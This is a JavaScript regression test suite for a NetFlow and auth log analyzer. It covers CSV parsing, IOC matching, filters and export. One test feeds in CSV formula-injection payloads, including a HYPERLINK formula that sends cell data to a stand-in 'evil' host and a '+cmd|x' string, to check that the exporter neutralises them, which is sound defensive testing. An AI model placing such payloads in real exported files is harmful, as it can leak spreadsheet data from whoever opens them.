/* Regression tests for Taegis NetFlow Analyzer. They run INSIDE the analyzer page (tests/run.html
   loads a build in an iframe and evaluates this file in it), drive the real functions and DOM,
   and use only fabricated data built below plus sample/taegis-sample-synthetic.csv.
   Each test maps to a bug fixed in v0.6.3 — see tests/README.md. */
window.__runTests = async function(){
  const out=[]; const sleep=ms=>new Promise(r=>setTimeout(r,ms));
  const alerts=[]; window.alert=m=>alerts.push(String(m));   // failed loads alert(); don't block the run
  const q=s=>document.querySelector(s), qa=s=>[...document.querySelectorAll(s)];
  const cell=v=>/[",\n]/.test(v)?'"'+String(v).replace(/"/g,'""')+'"':String(v);
  const H=['type','event_time_usec','action','flow_action','action_result','source_address','source_port','destination_address','destination_port','source_nat_address','protocol','tx_byte_count','rx_byte_count','application_name','mfa_result','mfa_used','event_name','sensor_type','sensor_id','dest_ipgeo_summary','user_name','domain_name','additional_destination_addresses','additional_domain_names'];
  const mk=rows=>[H.join(','),...rows.map(o=>H.map(h=>cell(o[h]??'')).join(','))].join('\n')+'\n';
  const nf=o=>({type:'netflow',event_time_usec:'2026-03-15T14:00:00Z',flow_action:'FW_ALLOWED',source_address:'10.20.5.11',source_port:'51544',destination_address:'140.82.113.20',destination_port:'443',protocol:'6',tx_byte_count:'100',rx_byte_count:'200',sensor_type:'FORTIGATE_FW',sensor_id:'FW-EDGE-01',...o});
  const au=o=>({type:'auth',event_time_usec:'2026-03-15T14:05:00Z',action:'LOGON',source_address:'203.0.113.9',user_name:'a@x.test',...o});
  const load=rows=>ingest(mk(rows));
  const count=sel=>parseInt(q(sel).textContent.replace(/,/g,''),10)||0;
  // every test starts from clean filters and no IOC list, so one test cannot leak state into the next
  const clean=()=>{ IOCS=null; q('#ioc-input').value=''; ['#nf-q','#rs-q','#au-q','#tl-q','#g-from','#g-to'].forEach(s=>q(s).value='');
    ['#nf-action','#au-res','#tl-type','#rs-dir'].forEach(s=>q(s).value=''); q('#g-public').checked=false; };
  const test=async(id,name,fn)=>{ clean(); try{ const r=await fn(); out.push({id,pass:!!r.pass,name,detail:r.detail}); }catch(e){ out.push({id,pass:false,name,detail:'threw: '+e.message}); } };

  await test('sample','synthetic sample loads with the expected counts',async()=>{
    ingest(await (await fetch('/sample/taegis-sample-synthetic.csv')).text());
    const c={events:REC.length,netflow:REC.filter(r=>r.cat==='netflow').length,auth:REC.filter(r=>r.cat==='auth').length,resetRows:qa('#rs-table tbody tr').length,nfRows:qa('#nf-table tbody tr').length};
    return {pass:c.events===41&&c.netflow===33&&c.auth===8&&c.resetRows===10&&c.nfRows===33,detail:JSON.stringify(c)};
  });

  await test('csv-1','parser: text after a closing quote stays in the same field and row',()=>{
    const got=JSON.stringify(parseCSV('a,b,c\n"abc"def,2,3\n4,5,6\n'));
    return {pass:got==='[["a","b","c"],["abcdef","2","3"],["4","5","6"]]',detail:got};
  });

  await test('csv-2','parser: skipping columns leaves the kept columns identical',async()=>{
    const text=await (await fetch('/sample/taegis-sample-synthetic.csv')).text();
    const full=parseCSV(text), keep=full[0].map((_,i)=>i%3!==1), part=parseCSV(text,()=>keep);
    let bad=0; for(let r=0;r<full.length;r++){ if(part[r].length!==full[r].length) bad++; for(let c=0;c<full[r].length;c++){ if(part[r][c]!==((r===0||keep[c])?full[r][c]:'')) bad++; } }
    return {pass:bad===0&&full.length===42,detail:`${full.length} rows, ${bad} mismatching cells`};
  });

  await test('1','IOC comment words are not treated as indicators',()=>{
    load([nf({domain_name:'www.example.com',destination_address:'8.8.8.8'}),nf({destination_address:'45.84.59.21'})]);
    q('#ioc-input').value='# seen in dot com phishing campaign\n45.84.59.21   # inline note about evil.org\n'; runSweep();
    const hits=REC.filter(r=>r.__ioc).map(r=>r.__ioc);
    return {pass:IOCS.doms.size===0&&hits.length===1&&hits[0]==='45.84.59.21',detail:`domain indicators: [${[...IOCS.doms].join(', ')}]; hits: [${hits.join(', ')}]`};
  });

  await test('2','Netflow export has the same rows as the on-screen table',()=>{
    const geo=JSON.stringify({asn:{autonomous_system_no:1,autonomous_system_org:'Example Net'},city:{name:'Frankfurt'},country:{iso_code:'DE'}});
    load([nf({destination_port:'3389'}),nf({destination_port:'3389',dest_ipgeo_summary:geo}),nf({destination_port:'443'})]);
    q('#nf-q').value='rdp'; drawNetflow(); const a=[count('#nf-count'),currentRows('netflow').length];
    q('#nf-q').value='de / frankfurt'; drawNetflow(); const b=[count('#nf-count'),currentRows('netflow').length];
    return {pass:a[0]===2&&a[1]===2&&b[0]===1&&b[1]===1,detail:`filter "rdp": shown ${a[0]}, exported ${a[1]}; filter "de / frankfurt": shown ${b[0]}, exported ${b[1]}`};
  });

  await test('3','epoch timestamps in s / ms / us / ns all resolve to the same instant',()=>{
    const vals=['1794443378','1794443378000','1794443378000000','1794443378000000000','2026-11-12T00:29:38Z'];
    load(vals.map(t=>nf({event_time_usec:t})));
    const got=REC.map(r=>r.ts?r.ts.toISOString():'null');
    return {pass:got.every(g=>g==='2026-11-12T00:29:38.000Z'),detail:vals.map((v,i)=>`${v.length} chars -> ${got[i]}`).join('; ')};
  });

  await test('4','dropping an IOC file on the IOC tab loads IOCs and keeps the dataset',async()=>{
    load([nf({}),nf({}),nf({destination_address:'45.84.59.21'})]);
    q('nav button[data-v="ioc"]').click();
    const dt=new DataTransfer(); dt.items.add(new File(['45.84.59.21\nevil.example.com\n'],'iocs.txt',{type:'text/plain'}));
    q('#ioc-input').dispatchEvent(new DragEvent('drop',{bubbles:true,cancelable:true,dataTransfer:dt}));
    await sleep(700);
    const r={events:REC.length,iocBox:q('#ioc-input').value.trim().replace(/\n/g,' '),hits:REC.filter(x=>x.__ioc).length};
    q('nav button[data-v="netflow"]').click();
    return {pass:r.events===3&&r.iocBox.includes('45.84.59.21')&&r.hits===1,detail:JSON.stringify(r)};
  });

  await test('5a','loading a second file resets dropdowns and filters and re-runs the IOC sweep',()=>{
    load([nf({flow_action:'FW_RESET_CLIENT_TO_SERVER'}),nf({flow_action:'FW_ALLOWED',destination_address:'45.84.59.21'})]);
    q('#ioc-input').value='45.84.59.21'; runSweep();
    q('#nf-action').value='FW_RESET_CLIENT_TO_SERVER'; q('#nf-q').value='10.20'; drawNetflow();
    load([nf({flow_action:'FW_BLOCKED',destination_address:'45.84.59.21'}),nf({flow_action:'FW_BLOCKED',destination_address:'45.84.59.21'}),nf({flow_action:'FW_UNKNOWN'})]);
    const r={actions:[...q('#nf-action').options].map(o=>o.value).filter(Boolean),flows:count('#nf-count'),textFilter:q('#nf-q').value,flagged:REC.filter(x=>x.__ioc).length,summary:q('#ioc-summary').textContent.slice(0,40)};
    return {pass:r.actions.join()==='FW_BLOCKED,FW_UNKNOWN'&&r.flows===3&&r.textFilter===''&&r.flagged===2&&/^2 matching/.test(r.summary),detail:JSON.stringify(r)};
  });

  await test('5b','a failed load keeps the previous dataset and its file name',async()=>{
    readFile(new File([mk([nf({}),nf({})])],'good.csv')); await sleep(500);
    readFile(new File([''],'empty.csv')); await sleep(500);
    const a={file:FILENAME,label:q('#fname').textContent,events:REC.length};
    readFile(new File(['just a note\nnot a csv\n'],'notes.txt')); await sleep(500);
    const b={file:FILENAME,events:REC.length};
    return {pass:a.file==='good.csv'&&a.label.includes('good.csv')&&a.events===2&&b.file==='good.csv'&&b.events===2,detail:`after empty.csv: ${JSON.stringify(a)}; after notes.txt: ${JSON.stringify(b)}`};
  });

  await test('6','failure values are not coloured as success (result and MFA tags)',()=>{
    load([au({action_result:'UNSUCCESSFUL',mfa_result:'MFA_NOT_USED'}),au({action_result:'INVALID_PASSWORD',mfa_result:'UNSUCCESSFUL'}),au({action_result:'SUCCESS',mfa_result:'SUCCESS'}),au({action_result:'FAILED',mfa_result:'FAILED'}),au({action_result:'PASSWORD_EXPIRED',mfa_used:'true'})]);
    drawAuth();
    const res={},mfa={};
    for(const tr of qa('#au-table tbody tr')){ const t=tr.children[5].querySelector('.tag'), m=tr.children[6].querySelector('.tag');
      if(t) res[t.textContent]=t.className.replace('tag','').trim(); if(m) mfa[m.textContent]=m.className.replace('tag','').trim(); }
    const nfOK=/tag ok/.test(resultTag({result:'',action:'FW_ALLOWED'}))&&/tag bad/.test(resultTag({result:'',action:'FW_BLOCKED'}));
    const pass=res.UNSUCCESSFUL==='bad'&&res.INVALID_PASSWORD==='bad'&&res.PASSWORD_EXPIRED==='bad'&&res.SUCCESS==='ok'&&res.FAILED==='bad'
      &&mfa.MFA_NOT_USED!=='ok'&&mfa.UNSUCCESSFUL==='bad'&&mfa.SUCCESS==='ok'&&mfa.FAILED==='bad'&&mfa.MFA_USED==='ok'&&nfOK;
    return {pass,detail:`result: ${JSON.stringify(res)}; mfa: ${JSON.stringify(mfa)}; FW_ALLOWED ok / FW_BLOCKED bad: ${nfOK}`};
  });

  await test('7','IOC sweep matches IPv6, NAT, additional-address and defanged indicators',()=>{
    load([nf({source_address:'2001:DB8::BAD'}),nf({source_nat_address:'45.84.59.21'}),nf({additional_destination_addresses:'["193.187.151.190","10.1.1.1"]'}),
      nf({domain_name:'cdn.evil.example.com'}),nf({additional_domain_names:'["login.bad.example.net"]'}),nf({})]);
    q('#ioc-input').value='2001:db8:0:0:0:0:0:bad\n45.84.59[.]21\n193.187.151.190\nhxxps://evil[.]example[.]com/gate.php\nbad.example.net\nattacker@gmail.com\nd41d8cd98f00b204e9800998ecf8427e\n'; runSweep();
    const flags=REC.map(r=>r.__ioc?1:0).join('');
    return {pass:flags==='111110',detail:`rows [v6 src, NAT, additional dst, domain via URL, additional domain, clean] flagged: ${flags}; parsed: ${q('#ioc-parsed').textContent}`};
  });

  await test('8','clicking an IP pivots to that exact address; partial text still matches as a substring',()=>{
    load([nf({source_address:'10.0.44.6'}),nf({source_address:'10.0.44.65'}),nf({source_address:'10.0.44.66'}),nf({source_address:'110.0.44.6'})]);
    qa('#nf-table td.ip').find(td=>td.textContent.trim()==='10.0.44.6').click();
    const r={netflow:count('#nf-count'),timeline:count('#tl-count'),exported:currentRows('netflow').length};
    q('#nf-q').value='10.0.44.'; drawNetflow(); r.partial=count('#nf-count');
    return {pass:r.netflow===1&&r.timeline===1&&r.exported===1&&r.partial===4,detail:JSON.stringify(r)};
  });

  await test('9','CSV export neutralises formula cells and quotes carriage returns',()=>{
    const evil='=HYPERLINK("http://evil/?"&A1,"click")';
    load([au({user_name:evil,domain_name:'@SUM(1+1)'}),au({user_name:'+cmd|x',domain_name:'-2+3'}),au({user_name:'plain',domain_name:'-'})]);
    let cap=''; const orig=window.download; window.download=(n,t)=>{cap=t;}; exportCSV('timeline'); window.download=orig;
    const cells=parseCSV(cap).slice(1).flat();
    const live=cells.filter(c=>/^[=+@]/.test(c)||(/^-/.test(c)&&c.length>1&&!/^-\d+(\.\d+)?$/.test(c)));
    const kept=cells.includes("'"+evil)&&cells.includes('-'), cr=csvCell('a\rb')==='"a\rb"';
    return {pass:live.length===0&&kept&&cr,detail:`cells a spreadsheet would run as formulas: ${JSON.stringify(live)}; original text kept after the apostrophe: ${kept}; CR quoted: ${cr}`};
  });

  await test('10a','a redraw reads the filter inputs a fixed number of times, not once per row',()=>{
    load(Array.from({length:2000},(_,i)=>nf({source_port:String(1024+i)})));
    const orig=document.querySelector; let n=0; document.querySelector=function(){ n++; return orig.apply(document,arguments); };
    try{ redrawAll(); } finally { delete document.querySelector; }
    return {pass:n<200,detail:`${n.toLocaleString()} DOM lookups for one redraw of 2,000 rows`};
  });

  await test('10b','typing in a text filter is debounced',async()=>{
    load(Array.from({length:500},(_,i)=>nf({source_port:String(1024+i)})));
    let renders=0; const mo=new MutationObserver(()=>renders++); mo.observe(q('#nf-table'),{childList:true});
    for(const v of ['1','10','10.','10.2','10.20']){ q('#nf-q').value=v; q('#nf-q').dispatchEvent(new Event('input',{bubbles:true})); await sleep(15); }
    await sleep(700); mo.disconnect();
    return {pass:renders===1&&count('#nf-count')===500,detail:`${renders} table render(s) for 5 keystrokes; final count ${count('#nf-count')}`};
  });

  await test('10c','raw CSV rows are not kept after loading',()=>{
    load(Array.from({length:50},()=>nf({})));
    const rawRows=(typeof RAW==='undefined')?0:RAW.length, perRec=REC.filter(r=>r.raw!==undefined).length;
    return {pass:rawRows===0&&perRec===0,detail:`rows held in RAW: ${rawRows}; records holding a raw row: ${perRec}`};
  });

  clean();
  return {build:document.title,passed:out.filter(t=>t.pass).length,failed:out.filter(t=>!t.pass).length,results:out};
};
